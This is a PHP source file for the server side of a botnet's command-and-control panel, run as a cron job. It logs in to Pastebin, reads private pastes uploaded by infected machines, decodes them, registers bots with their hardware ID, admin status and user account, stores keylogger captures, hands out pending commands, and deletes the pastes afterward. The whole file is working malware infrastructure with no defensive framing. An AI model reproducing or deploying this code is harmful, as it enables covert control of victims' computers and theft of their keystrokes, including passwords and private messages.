<?php


/*
Run this as crontab task


*/
	function connection(){
		$dsn = 'mysql:host=localhost;dbname=waifu'; 
		$username = 'root'; 
		$pwd='root'; 
		try {
			return new PDO($dsn, $username, $pwd);
		}
		catch (PDOException $e) {
			$error_message = $e->getMessage();
			echo "error";
			return "";
		}
	}
	
	
	function BotExist($hwid){
		$db = connection();
		$check = "SELECT * FROM `bots` WHERE `HWID` = :hwid";
		if($sth = $db->prepare($check)){
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
			if($sth->rowCount() > 0){
				return true;
			}
		}
		return false;
	}
	function AddBot($hwid, $admin_status, $user_acc){
		$db = connection();
		$add_new = "INSERT INTO `bots` (`HWID`, `admin_status`, `User_Account`, `last_seen`) VALUES (:hwid, :admin_status, :user_acc, CURRENT_TIMESTAMP)";
		if($sth = $db->prepare($add_new)){
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":admin_status", $admin_status);
			$sth->bindParam(":user_acc", $user_acc);
			$sth->execute();
			return true;
		}
		return false;
	}
	function UpdateBot($hwid){
		$db = connection();
		$update = "UPDATE `bots` SET `last_seen` = CURRENT_TIMESTAMP WHERE `HWID` = :hwid";
		if($sth = $db->prepare($update)){
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
			
		}
	}
	function UpdateCompleteTasks($hwid, $result, $id){
		$db = connection();
		$insert = "INSERT INTO `complete_tasks` (`cmd_id`, `result`, `cmd_id`, `HWID`, `time_executed`) VALUES (:cmd_id, :result, :cmd_id, :hwid, CURRENT_TIMESTAMP)";
		$update = "UPDATE `tasks` SET `executed` = `executed` + 1 WHERE `id` = :id";
		$data = "SELECT * FROM `tasks` WHERE `id` = :id";
		if($sth = $db->prepare($data)){
			$sth->bindParam(":id", $id);
			$sth->execute();
			if($sth->rowCount() <= 0){
				return;
			}
		}
		if($sth = $db->prepare($update)){
			$sth->bindParam(":id", $id);
			$sth->execute();
		}
		if($sth = $db->prepare($insert)){
				$sth->bindParam(":cmd_id", $id);
				$sth->bindParam(":result", $result);
				$sth->bindParam(":hwid", $hwid);
				$sth->execute();
				
		}
	}
	function AlreadyExecuted($cmd, $hwid){
		$db = connection();
		$already_executed = "SELECT * FROM `complete_tasks` WHERE `HWID` = :hwid AND `cmd_id` = :cmd_id";
		if($sth = $db->prepare($already_executed)){
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":cmd_id", $cmd);
			$sth->execute();
			if($sth->rowCount() > 0){
				return true;
			}
			return false;
		}
	}

	function GetCmd($hwid){
		
		$db = connection();
		$table = "SELECT * FROM `tasks` WHERE `status` = '1' AND `executed` < `maxbots`;";
		
        if($sth = $db->prepare($table)){
			$sth->bindParam(':username', $session);
            $sth->execute();
			$commands = array("tasks"=>array());
            if($sth->rowCount() > 0 ){
				while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
					if(!AlreadyExecuted($row["id"], $hwid)){
						$commands["tasks"][] = array((int)$row["cmd_num"], $row["cmd"], (int)$row["id"]);
					}
				}
				return json_encode($commands);
            }
        }	
		return "";
	}
	function InsertKeyLog($hwid, $keylog){
		
		$db = connection();
		$key_log_insert = "INSERT INTO `keylogger_logs` (`HWID`, `keylog_data`, `keylog_last_date`) VALUES (:hwid, :keylog_data, CURRENT_TIMESTAMP)";
		if($sth = $db->prepare($key_log_insert)){
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":keylog_data", $keylog_data);
			$sth->execute();
		}
		
	}
	function KeylogAppend($hwid, $keylog){
		
		$db = connection();
		$key_log_insert = "UPDATE `keylogger_logs` SET `keylog_data` = CONCAT(`keylog_data`, :keylog) WHERE `HWID` = :hwid";
		if($sth = $db->prepare($key_log_insert)){
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":keylog", $keylog_data);
			$sth->execute();
		}
	}
	function KeylogExists($hwid){
		$keylog_exists = "SELECT * FROM `keylogger_logs` WHERE `hwid` = :hwid";
		$db = connection();
		if($sth = $db->prepare($keylog_exists)){
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
			if($sth->rowCount() > 0){
				return true;
			}
		}
		return false;
	}
	function memeshit($ch){
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	}
	
	function PasteBinLogin(){
		$api_dev_key 		= 'apikeyhere';
		$api_user_name 		= 'apiusernamehere';
		$api_user_password 	= 'passwordheree';
		$api_user_name 		= urlencode($api_user_name);
		$api_user_password 	= urlencode($api_user_password);
		$url			= 'https://pastebin.com/api/api_login.php';
		$ch			= curl_init($url);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_dev_key='.$api_dev_key.'&api_user_name='.$api_user_name.'&api_user_password='.$api_user_password.'');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_NOBODY, 0);
		memeshit($ch);
		$response 		= curl_exec($ch);
		return $response;
	}
	function GetPastesCreated($api_user_key){
		$api_dev_key 		= 'apikeyhere';
		$url 			= 'https://pastebin.com/api/api_post.php';
		$ch 			= curl_init($url);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=list&api_user_key='.$api_user_key.'&api_dev_key='.$api_dev_key);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_NOBODY, 0);
		
		memeshit($ch);
		$response  		= curl_exec($ch);
		//echo $response;
		return "<?xml version='1.0' encoding='UTF-8'?><head>".$response."</head>";
		
		
	}
	function GetPasteKeyRawData($api_user_key, $paste_key){
		$api_dev_key 		= 'apikeyhere';
		$url 			= 'https://pastebin.com/api/api_raw.php';
		$ch 			= curl_init($url);

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=show_paste&api_user_key='.$api_user_key.'&api_dev_key='.$api_dev_key.'&api_paste_key='.$paste_key.'');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_NOBODY, 0);

		memeshit($ch);
		$response  		= curl_exec($ch);
		return $response;
	}
	function DeletePaste($api_user_key, $api_paste_key){
		$api_dev_key 		= 'apikeyhere';
		$url 			= 'https://pastebin.com/api/api_post.php';
		$ch 			= curl_init($url);

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=delete&api_user_key='.$api_user_key.'&api_dev_key='.$api_dev_key.'&api_paste_key='.$api_paste_key.'');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_NOBODY, 0);

		memeshit($ch);
		$response  		= curl_exec($ch);
		echo $response;	
	}
	function CheckAndUpdateTables(){
		$api_user_key = PasteBinLogin();
		$pastes = GetPastesCreated($api_user_key);
		$xml = simplexml_load_string($pastes);
		
		$json_string = json_encode($xml);    
		$result_array = json_decode($json_string, TRUE);
		//print_r($json_string);
		
		foreach($result_array["paste"] as $paste){
	
			if($paste["paste_private"] == "2"){
				// it is a private paste
				$paste_key = $paste["paste_key"];
				
				$paste_title = $paste["paste_title"];
				$raw_data = GetPasteKeyRawData($api_user_key, $paste_key);
				
				$post_data = hex2bin($raw_data);
				$decrypted_param = "";
				parse_str($post_data, $decrypted_param);
				$decrypted_params = array_values($decrypted_param);
				var_dump($decrypted_params);
				$decrypted_params_count = count($decrypted_params);
				if($paste_title == "log"){
					echo "is log";
					if($decrypted_params_count == 2){
						
						// i honestly dont give a fuck about building a pyrimad right now lol 
						$hwid = $decrypted_params[0];
						$keylog_data = $decrypted_params[1];
						if(KeylogExists($hwid)){
							KeylogAppend($hwid, $keylog_data);
						}
						else{
							InsertKeyLog($hwid, $keylog_data);
						}
					}
				}
				else if($paste_title == "knock"){
					
					if($decrypted_params_count == 3){
						//echo "is 3";
						// i honestly dont give a fuck about building a pyrimad right now lol 
						$hwid = $decrypted_params[0];
						$admin_status = $decrypted_params[1];
						$user_acc = $decrypted_params[2];
						if(BotExist($hwid)){
							//echo "update bot";
							UpdateBot($hwid);
						}
						else{
							AddBot($hwid, $admin_status, $user_acc);
						}
					}
				}
				// if paste is private, we delete right after fucking this
				DeletePaste($api_user_key, $paste_key);
				
			}
		}
		
	}
	CheckAndUpdateTables();
?>